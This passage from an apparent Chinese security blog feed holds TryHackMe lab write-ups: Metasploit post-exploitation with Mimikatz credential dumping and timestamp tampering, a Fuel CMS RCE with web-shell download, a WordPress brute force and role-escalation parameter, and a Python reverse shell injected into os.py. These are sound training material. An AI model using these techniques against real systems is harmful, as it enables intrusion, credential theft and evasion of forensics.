<p>使用它的这个程序，设置好<code>session</code> 后，直接运行，运行成功后会打开一个新的<code>meterpreter shell</code>会话，使用<code>getprivs</code>列出我们拥有文件的所有权，来验证我们是否已经获得权限</p>
<h1 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h1><p><code>migrate</code> 转移进程id,隐藏自身<br><code>getuid</code> 查看自己的用户权限</p>
<h2 id="kiwi"><a href="#kiwi" class="headerlink" title="kiwi"></a>kiwi</h2><p><code>load kiwi</code></p>
<p>Mimikatz是一个相当出名的密码转储工具，它非常有用。现在使用<code>load kiwi</code>命令加载它(kiwi是Mimikatz的最新版本。</p>
<p>使用<code>help</code>获取帮助命令</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200424_111435.jpg" alt="kiwi-help"></p>
<p><code>creds_all</code> 允许我们检索所有的凭证</p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p><code>hashdump</code>获取系统上密码的hash值，有了hash值，我们就可以尝试使用<code>hashcat</code>去爆破</p>
<p><code>screenshare</code>获取目标机器桌面的实时共享(类似cs的vnc)<br><code>record_mic</code> 麦克风录音<br><code>timestomp</code>修改时间戳，阻碍安全人员信息取证</p>
<p><code>Golden ticket attacks</code> 黄金票据攻击</p>
<blockquote>
<p>简而言之，黄金票据攻击使我们能够保持持久性并以域上的任何用户身份进行身份验证。</p>
</blockquote>
<p><code>run post/windows/manage/enable_rdp</code>打开目标机器的远程连接</p>
<h1 id="更进一步"><a href="#更进一步" class="headerlink" title="更进一步"></a>更进一步</h1><p><a href="http://www.test666.me/archives/264/" target="_blank" rel="noopener">关于黄金票据攻击</a><br><a href="https://www.hacking8.com/MiscSecNotes/windwos-test.html" target="_blank" rel="noopener">Windows渗透测试</a></p>
<p>[exploits](Explore manual exploitation via exploit code found on exploit-db. )</p>
<blockquote>
<p>As you advance in your pentesting skills, you will be faced eventually with exploitation without the usage of Metasploit. Provided above is the link to one of the exploits found on Exploit DB for hijacking Icecast for remote code execution. While not required by the room, it’s recommended to attempt exploitation via the provided code or via another similar exploit to further hone your skills.</p>
</blockquote>
<p><strong>随着渗透技能的提升，终会面临不能用Metasploit的状况。 上面提供的链接指向在Exploit DB上用于利用Icecast劫持远程执行代码的漏洞之一。 虽然房间没有要求，但建议通过提供的代码或其他类似的利用方式尝试进行利用，以进一步磨练您的技能。</strong></p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>TryHackMe</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>kiwi</tag>
        <tag>icecast</tag>
      </tags>
  </entry>
  <entry>
    <title>TryHackMe-Ignite</title>
    <url>/2020/04/25/TryHackMe-Ignite/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>靶机下载链接:<a href="https://darkstar7471.com/downloads/ctf-vms/Ignite.ova" target="_blank" rel="noopener">可能需要翻墙</a></p>
<p>在线靶机链接:<a href="https://tryhackme.com/room/ignite" target="_blank" rel="noopener">Ignite</a></p>
<p>难度:简单</p>
<a id="more"></a>

<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>常规思路，上来先扫一波，结果发现目标只开放了80端口。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200425_200217.jpg" alt="nmap"></p>
<p>访问之后，可以发现目标是使用fuel-cms内容管理系统搭建的网站，版本是1.41</p>
<p>这里有后台的默认登录密码。。虽然好像在里面找不到上传点。。。一开始我甚至都不知道这密码，，<br><img src="https://images.atsud0.me/images/post/Screenshot_20200425_200440.jpg" alt="admin"></p>
<p>用<code>gobuster</code>扫一波</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200503_204439.jpg" alt="dir-enum"></p>
<p>访问<code>robots.txt</code>可以知道反爬的目录名为<code>fuel</code><br>这里我差不多试了一个个页面去访问，找到了登录页面，但是不知道密码，也没有尝试弱口令，最后找不到思路。(这里我不知道前台页面有登录密码</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>所以只好改变思路，只好去google找找<code>fuel-cms</code>的<code>exploit</code></p>
<p>结果，还真有一个。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200425_201651.jpg" alt="exploid"></p>
<p>看这cve描述这是一个远程代码执行的漏洞。</p>
<p>让我们去下载这个exploit。将源码的url修改为我们的攻击目标,将<code>proxy</code>那行注释掉。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200425_202114.jpg" alt="pypy"></p>
<p>修改好后就可以使用python2 执行，执行后会有cmd提示输入指令。在cmd字符串后输入whoami，成功执行。不过下面有php的错误提示。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200425_202334.jpg" alt="47138-remote"></p>
<p>在这里我尝试cd到其他的目录，可是不行。查看<code>/etc/passwd</code>后可以发现除了<code>root</code>用户就没有其他普通用户了.<br><img src="https://images.atsud0.me/images/post/Screenshot_20200425_203648.jpg" alt="etc,passwd"></p>
<p>因为在这个<code>exploit</code>里执行命令的输出有点繁琐，而且无法切换到其他目录。。所以我试着用<code>wget</code> 下载自己的web-shell。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200425_203856.jpg" alt="wget"></p>
<p>看到我网站有请求我就知道成功了。不过不清楚为什么会一次下载十个，而且会自动改变后缀。我暂且蒙在古里。</p>
<p>将其他一个改为正常的php后缀后，开启监听使用并网页访问执行。</p>
<p><img src="/publichttps://images.atsud0.me/images/post/Screenshot_20200425_191034.jpg" alt="user-flag"></p>
<p>成功，并且拿到第一个flag。拿了第一个flag后，我脑子发热用python生成了一个新的交互shell<br><code>python -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</code><br><img src="https://images.atsud0.me/images/post/Screenshot_20200425_204721.jpg" alt="span"></p>
<blockquote>
<p>事实证明我这一步操作是对的，即使我这里不操作，我在后面<code>su root</code>也是需要生成这样一个交互性的shell的。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200425_205004.jpg" alt="wrong"></p>
</blockquote>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>接下来就要考虑提权了。</p>
<p>通过查找<code>suid</code>位文件，和<code>crontab</code>里没有定时执行任务，以及<code>/etc/shadow</code>无法查看,我猜测这里需要去找文件。</p>
<p>找什么文件呢?要找网站的服务配置文件，或者找一些日志文件，看能不能发现什么。</p>
<p>这里就是大海捞针了，因为这里是有mysql服务的，所以我就打算先去网站根目录下找找数据库的配置文件</p>
<p>搜索一番后发现配置文件在<code>/var/www/html/fuel/application/config</code>下</p>
<p>查看网站配置文件，发现root密码，尝试切换到root,成功！</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200425_193145.jpg" alt="get-shell"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个靶机总的来说难度不难。主要还是要善于使用<code>exploitdb</code>这些大佬们的智慧结晶。</p>
<p>还有阅读代码很重要。。。<br>不要拿到exploit不会用。。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200425_205653.jpg" alt="shale"></p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>TryHackMe</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>靶机实验</tag>
        <tag>cve-2018-16763</tag>
      </tags>
  </entry>
  <entry>
    <title>TryHackMe-Jack</title>
    <url>/2020/10/17/TryHackMe-Jack/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>在线链接：<a href="https://tryhackme.com/room/jack" target="_blank" rel="noopener">Jack</a></p>
<a id="more"></a>

<h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><h3 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# nmap -p- -sC -sV 10.10.145.220</span><br><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-10-04 02:58 UTC</span><br><span class="line">Nmap scan report for ip-10-10-145-220.eu-west-1.compute.internal (10.10.145.220)</span><br><span class="line">Host is up (0.0019s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 3e:79:78:08:93:31:d0:83:7f:e2:bc:b6:14:bf:5d:9b (RSA)</span><br><span class="line">|   256 3a:67:9f:af:7e:66:fa:e3:f8:c7:54:49:63:38:a2:93 (ECDSA)</span><br><span class="line">|_  256 8c:ef:55:b0:23:73:2c:14:09:45:22:ac:84:cb:40:d2 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-generator: WordPress 5.3.2</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_&#x2F;wp-admin&#x2F;</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Jack&amp;#039;s Personal Site &amp;#8211; Blog for Jacks writing adven...</span><br><span class="line">MAC Address: 02:5D:A7:C5:D7:FD (Unknown)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 13.06 seconds</span><br></pre></td></tr></table></figure>





<h3 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[+] URL: http://jack.thm/ [10.10.145.220]</span><br><span class="line">[+] Started: Sun Oct  4 03:13:23 2020</span><br><span class="line"></span><br><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] robots.txt found: http://jack.thm/robots.txt</span><br><span class="line"> | Interesting Entries:</span><br><span class="line"> |  - /wp-admin/</span><br><span class="line"> |  - /wp-admin/admin-ajax.php</span><br><span class="line"> | Found By: Robots Txt (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: http://jack.thm/xmlrpc.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</span><br><span class="line"></span><br><span class="line">[+] WordPress readme found: http://jack.thm/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] Upload directory has listing enabled: http://jack.thm/wp-content/uploads/</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: http://jack.thm/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 5.3.2 identified (Insecure, released on 2019-12-18).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - http://jack.thm/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.3.2&lt;/generator&gt;</span><br><span class="line"> |  - http://jack.thm/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.3.2&lt;/generator&gt;</span><br><span class="line"></span><br><span class="line">[+] WordPress theme <span class="keyword">in</span> use: online-portfolio</span><br><span class="line"> | Location: http://jack.thm/wp-content/themes/online-portfolio/</span><br><span class="line"> | Last Updated: 2020-08-18T00:00:00.000Z</span><br><span class="line"> | Readme: http://jack.thm/wp-content/themes/online-portfolio/readme.txt</span><br><span class="line"> | [!] The version is out of date, the latest version is 0.0.9</span><br><span class="line"> | Style URL: http://jack.thm/wp-content/themes/online-portfolio/style.css?ver=5.3.2</span><br><span class="line"> | Style Name: Online Portfolio</span><br><span class="line"> | Style URI: https://www.amplethemes.com/downloads/online-protfolio/</span><br><span class="line"> | Description: Online Portfolio WordPress portfolio theme <span class="keyword">for</span> building personal website. You can take full advantag...</span><br><span class="line"> | Author: Ample Themes</span><br><span class="line"> | Author URI: https://amplethemes.com/</span><br><span class="line"> |</span><br><span class="line"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="line"> | Confirmed By: Css Style In 404 Page (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 0.0.7 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - http://jack.thm/wp-content/themes/online-portfolio/style.css?ver=5.3.2, Match: <span class="string">'Version: 0.0.7'</span></span><br><span class="line"></span><br><span class="line">[+] Enumerating Users (via Passive and Aggressive Methods)</span><br><span class="line"> Brute Forcing Author IDs - Time: 00:00:00 &lt;======&gt; (10 / 10) 100.00% Time: 00:00:00</span><br><span class="line"></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] jack</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http://jack.thm/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] danny</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] wendy</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure>



<p>有三个用户，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;jack.thm -U user -P &#x2F;usr&#x2F;share&#x2F;wordpress&#x2F;fasttrack.txt</span><br><span class="line"></span><br><span class="line">[+] Performing password attack on Xmlrpc against 3 user&#x2F;s</span><br><span class="line">[SUCCESS] - wendy &#x2F; changelater                                                   </span><br><span class="line">Trying danny &#x2F; starwars Time: 00:01:22 &lt;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;   &gt; (646 &#x2F; 868) 74.42%  ETA: ??:??:</span><br><span class="line"></span><br><span class="line">[!] Valid Combinations Found:</span><br><span class="line"> | Username: wendy, Password: changelater</span><br></pre></td></tr></table></figure>

<p>这里我原先用了rockyou字典，但是等了2个多小时都毫无进展，于是换了一个小的。</p>
<h2 id="0x02-提权"><a href="#0x02-提权" class="headerlink" title="0x02 提权"></a>0x02 提权</h2><p>登陆进去后，只是一个普通的用户，做不了什么事情。</p>
<p><img src="https://images.atsud0.me/images/post/image-20201011143204465.png" alt="image-20201011143204465"></p>
<p>但是通过提示的<code>ure_other_roles</code>可以搜索到一个user-role-edite插件4.25版本的越权漏洞，可以轻易的登陆成admin用户。</p>
<p><img src="https://images.atsud0.me/images/post/image-20201011140720925.png" alt="image-20201011140720925"></p>
<p>漏洞利用也很简单，burp抓包，进入个人资料页，直接更新资料。</p>
<p><img src="https://images.atsud0.me/images/post/image-20201011143302363.png" alt="image-20201011143302363"></p>
<p>添加一个参数即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ure_other_roles&#x3D;adminsitrator</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20201011150546590.png" alt="image-20201011150546590"></p>
<p>登陆成admin用户后，我一般习惯修改主题文件，但是主题的php文件无法修改，于是就换成改插件的</p>
<p><img src="https://images.atsud0.me/images/post/image-20201009162043378.png" alt="image-20201009162043378"></p>
<p><img src="https://images.atsud0.me/images/post/image-20201011150851846.png" alt="image-20201011150851846"></p>
<p>接着开启监听，访问<code>http://jack.thm/wp-content/plugins/akismet/index.php</code></p>
<p><img src="https://images.atsud0.me/images/post/image-20201011150938757.png" alt="image-20201011150938757"></p>
<p>通过jack用户家目录下的备忘录可以知道，上次jack的备份文件差点导致被hack。</p>
<p><img src="https://images.atsud0.me/images/post/image-20201011151109922.png" alt="image-20201011151109922"></p>
<p>这是一个重要提示，接着去访问/var/backups/</p>
<p><img src="https://images.atsud0.me/images/post/image-20201011151230563.png" alt="image-20201011151230563"></p>
<p>可以发现有一个777权限的id_rsa。将这个文件复制到网站的根目录下</p>
<p><img src="https://images.atsud0.me/images/post/image-20201011151437443.png" alt="image-20201011151437443"></p>
<p>成功越权到jack</p>
<p><img src="https://images.atsud0.me/images/post/image-20201011151546495.png" alt="image-20201011151546495"></p>
<p>这个checker.py看上去是会定时执行的，但是这个脚本没有权限直接去修改它，当前目录也不能新建文件。</p>
<p><img src="https://images.atsud0.me/images/post/image-20201011151748582.png" alt="image-20201011151748582"></p>
<p>但是我们有权限去修改os.py。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import os,socket,subprocess</span><br><span class="line"></span><br><span class="line">s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">s.connect((&#39;ip&#39;,8888))  </span><br><span class="line">os.dup2(s.fileno(),0)</span><br><span class="line">os.dup2(s.fileno(),1)</span><br><span class="line">os.dup2(s.fileno(),2)</span><br><span class="line">p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;])</span><br></pre></td></tr></table></figure>

<p>简单的修改成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import socket,subprocess</span><br><span class="line"></span><br><span class="line">s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">s.connect((&#39;ip&#39;,8888))  </span><br><span class="line">dup2(s.fileno(),0)</span><br><span class="line">dup2(s.fileno(),1)</span><br><span class="line">dup2(s.fileno(),2)</span><br><span class="line">p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;])</span><br></pre></td></tr></table></figure>

<p>将上面修改后的内容，直接添加到os.py文件尾部。</p>
<p><img src="https://images.atsud0.me/images/post/image-20201011152202998.png" alt="image-20201011152202998"></p>
<p>直接打开python，成功返回shell，现在只要等待就好了。</p>
<p><img src="https://images.atsud0.me/images/post/image-20201011152431111.png" alt="image-20201011152431111"></p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>TryHackMe</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>wordpress</tag>
        <tag>user-role-edite_plugin</tag>
      </tags>
  </entry>
  <entry>
    <title>TryHackMe-Jeff</title>
    <url>/2020/10/17/TryHackMe-Jeff/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>在线链接：<a href="https://tryhackme.com/room/jeff" target="_blank" rel="noopener">Jeff</a></p>
<a id="more"></a>



<h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;ip jeff.thm&#39; &gt; &#x2F;etc&#x2F;hosts</span><br></pre></td></tr></table></figure>

<h3 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -p- -sC -sV 10.10.214.2</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 7e:43:5f:1e:58:a8:fc:c9:f7:fd:4b:40:0b:83:79:32 (RSA)</span><br><span class="line">|   256 5c:79:92:dd:e9:d1:46:50:70:f0:34:62:26:f0:69:39 (ECDSA)</span><br><span class="line">|_  256 ce:d9:82:2b:69:5f:82:d0:f5:5c:9b:3e:be:76:88:c3 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    nginx</span><br><span class="line">|_http-title: Jeffs Portfolio</span><br><span class="line">MAC Address: 02:76:70:D3:7C:07 (Unknown)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure>



<p>只开了两个端口，web和ssh。</p>
<h3 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# nc -nv 10.10.214.2 22</span><br><span class="line">(UNKNOWN) [10.10.214.2] 22 (ssh) open</span><br><span class="line">SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3</span><br><span class="line">^C</span><br><span class="line">Protocol mismatch.</span><br><span class="line">root@kali:~# ssh 10.10.214.2</span><br><span class="line">The authenticity of host &#39;10.10.214.2 (10.10.214.2)&#39; can&#39;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:81na22Hs&#x2F;2kaLeyNJit8TG9Ba4kVYm9LhIObseJmCZM.</span><br><span class="line">Are you sure you want to continue connecting (yes&#x2F;no&#x2F;[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#39;10.10.214.2&#39; (ECDSA) to the list of known hosts.</span><br><span class="line">root@10.10.214.2&#39;s password:</span><br><span class="line">^C</span><br></pre></td></tr></table></figure>

<p>我就简单看下有没有什么隐藏信息。。</p>
<h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><h4 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# gobuster dir -u http:&#x2F;&#x2F;jeff.thm -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">[+] Url:            http:&#x2F;&#x2F;jeff.thm</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster&#x2F;3.0.1</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2020&#x2F;10&#x2F;16 14:07:24 Starting gobuster</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;uploads (Status: 301)</span><br><span class="line">&#x2F;admin (Status: 301)</span><br><span class="line">&#x2F;assets (Status: 301)</span><br><span class="line">&#x2F;backups (Status: 301)</span><br><span class="line">&#x2F;source_codes (Status: 301)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2020&#x2F;10&#x2F;16 14:07:44 Finished</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<p>首页</p>
<p><img src="https://images.atsud0.me/images/post/image-20201017120018965.png" alt="image-20201017120018965"></p>
<p>uploads页面</p>
<p><img src="https://images.atsud0.me/images/post/image-20201017120055952.png" alt="image-20201017120055952"></p>
